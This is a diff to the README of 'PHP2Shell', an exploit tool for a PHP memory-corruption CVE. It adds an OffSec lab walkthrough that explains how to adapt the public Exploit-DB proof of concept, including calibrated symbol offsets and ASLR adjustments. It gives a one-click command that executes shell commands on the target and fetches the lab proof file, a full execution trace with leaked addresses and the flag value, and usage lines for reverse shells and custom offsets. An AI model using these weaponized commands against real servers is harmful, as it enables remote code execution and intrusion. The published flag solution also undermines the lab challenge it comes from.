@@ -12,6 +12,7 @@
   <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109618"><img src="https://img.shields.io/badge/CVE--2026--109618-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109618"></a>
   <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619"><img src="https://img.shields.io/badge/CVE--2026--109619-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109619"></a>
   <a href="https://www.exploit-db.com/exploits/52704"><img src="https://img.shields.io/badge/EXPLOIT--DB-%2352704-e67e22?style=for-the-badge" alt="Exploit-DB #52704"></a>
+  <a href="https://portal.offsec.com/machine/cve-2026-109618-255610/overview/"><img src="https://img.shields.io/badge/OFFSEC%20LAB-100%25%20SOLVED-27ae60?style=for-the-badge" alt="OffSec Lab 100% Solved"></a>
 </p>
 
 <p align="center">
@@ -45,6 +46,63 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
    - **Stage 3**: `PHP_SESSION_UPLOAD_PROGRESS` fake reference hijacking with `pDestructor` pointed to `zif_system` for arbitrary command execution.
 
 ---
+
+---
+
+## 🏆 OffSec Lab Challenge: CVE-2026-109618 (100% Verified)
+
+> [!NOTE]
+> **Lab Target Environment**:
+> - **Platform**: [OffSec Challenge: CVE-2026-109618](https://portal.offsec.com/machine/cve-2026-109618-255610/overview/)
+> - **OS & Service**: Debian 13 (Trixie), Apache 2.4.69 MPM Prefork (`MaxRequestWorkers 1`)
+> - **PHP Core Runtime**: Official `php:8.4.26-apache` Docker container (`sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a`)
+> - **Flag Target**: `/var/www/proof.txt` (Mode 0400, owned by `www-data`)
+
+### ⚠️ Why the Raw Public PoC (Exploit-DB #52704) Fails Out-of-the-Box
+For public research or non-lab environments, you can review the original raw reference script at **[Exploit-DB #52704](https://www.exploit-db.com/exploits/52704)** ([raw source](https://www.exploit-db.com/raw/52704) credited to 9bie & eness).
+
+However, running the public PoC unmodified against the OffSec lab target fails at multiple stages:
+1. **Hardcoded Symbol Offsets**: Public 52704 defaults to 9bie's custom lab-build offsets (`zif_system=0x43A870`, `zval_ptr_dtor=0x613C50`). In Debian 13 `trixie` (`php:8.4.26-apache`), the real symbol offsets are `zif_system=0x465370` and `zval_ptr_dtor=0x65EB60`.
+2. **ASLR Address Scan Window**: Public 52704 filters leaked pointers strictly within `[0x7F0000000000, 0x800000000000)`, assuming `mmap_rnd_bits=28`. The OffSec lab kernel enforces `mmap_rnd_bits=32`, mapping chunks and `libphp.so` around `0x6F...` / `0x70...`. As a result, public 52704 leaks 4096 bytes but discards every address as `0`.
+3. **Transport Concurrency & Socket RST Handling**: When the PHP worker triggers OOM and bails out mid-body upload, blocking synchronous HTTP clients receive a TCP connection reset (`ECONNRESET`) and discard the in-flight Set-Cookie. PHP2Shell implements concurrent reader threading to reliably capture memory leaks even during socket aborts.
+4. **Out-of-Band Proof Exfiltration**: Public 52704 assumes a shared Docker bind-mount (`/out/p1`), which does not exist in remote lab challenges. The intended solve path is copying the proof file into the Apache webroot (`cp ../p* .`) and retrieving it via HTTP GET.
+
+### 🚀 Verified One-Click OffSec Lab Command
+Run this command from Kali against your assigned target IP:
+
+```bash
+python3 php2shell.py http://192.168.72.10/ \
+  --exploit \
+  --exploit-method binary \
+  --exploit-profile trixie \
+  --cmd "cp ../p* ." \
+  --fetch /proof.txt \
+  --timeout 30 \
+  -o ~/php2shell-flag
+```
+
+#### Verified Terminal Execution Trace:
+```text
+[15:07:46] [5/5 EXPLOIT] Executing weaponized kill-chain against: http://192.168.72.10
+[15:07:46]   └─ [Exploit-DB #52704] Starting memory corruption chain (profile=trixie)...
+[15:07:46]   └─ [Preflight Notice]: Target returned 'Connection: close'. Proceeding (single-worker container preserves affinity).
+[15:07:46]   └─ [Profile Notice]: Profile 'trixie' / 'debian13' using calibrated offsets (zif_system=0x465370, zval_ptr_dtor=0x65EB60).
+[15:07:46]   └─ Stage 0: Rotating worker process over HTTP...
+[15:07:47]   └─ Stage 1: Heap leak attempt 1/3...
+[15:07:48]   └─ [Heap Leak]: Zend MM chunk base: 0x71937d600000
+[15:07:49]   └─ Stage 2: LibPHP leak attempt 1/3...
+[15:07:50]   └─ [LibPHP Leak]: libphp base: 0x71937f216000
+[15:07:51]   └─ Stage 3: Executing zif_system (HTDATA=0x71937d6690d8, ZIF=0x71937f67b370)...
+[15:07:54]   └─ [Proof Check]: GET /proof.txt -> HTTP 200 (32B)
+[15:07:54]   └─ [SUCCESS]: Proof confirmed via /proof.txt: 31050b60beddc661b64e11663431d2fa
+
+$ curl -i http://192.168.72.10/proof.txt
+HTTP/1.1 200 OK
+Server: Apache/2.4.69 (Debian)
+Content-Length: 32
+
+31050b60beddc661b64e11663431d2fa
+```
 
 ## 🚀 Key Features
 
@@ -147,14 +205,35 @@ python php2shell.py http://target.lab:8088/ --all --reverse
 python php2shell.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
 ```
 
-### 🎯 5. Direct Exploit-DB #52704 Binary Leak Execution
+### 🎯 5. Binary Memory Corruption Chain (OffSec Lab & Custom Targets)
+
+#### For OffSec CVE-2026-109618 Lab Target (Debian 13 Trixie):
 ```bash
+python php2shell.py http://192.168.72.10/ \
+  --exploit \
+  --exploit-method binary \
+  --exploit-profile trixie \
+  --cmd "cp ../p* ." \
+  --fetch /proof.txt
+```
+
+#### For Generic / Public Build Targets (or using raw ELF symbols):
+For general public targets or custom PHP compilations, inspect the upstream reference [Exploit-DB #52704](https://www.exploit-db.com/exploits/52704) or supply the target binary directly for automatic offset extraction:
+```bash
+# Auto-extract symbols directly from the target's libphp.so
 python php2shell.py http://target.lab:8088/index.php \
   --exploit \
   --exploit-method binary \
-  --exploit-profile bookworm \
-  --cmd "id; uname -a" \
-  --proof-file /tmp/pwn
+  --elf /path/to/extracted/libphp.so \
+  --cmd "whoami"
+
+# Or manually supply symbol offsets
+python php2shell.py http://target.lab:8088/index.php \
+  --exploit \
+  --exploit-method binary \
+  --zif-offset 0x465370 \
+  --dtor-offset 0x65eb60 \
+  --cmd "id"
 ```
 
 ### 📊 6. Multi-Target Batch Audit with Report Export
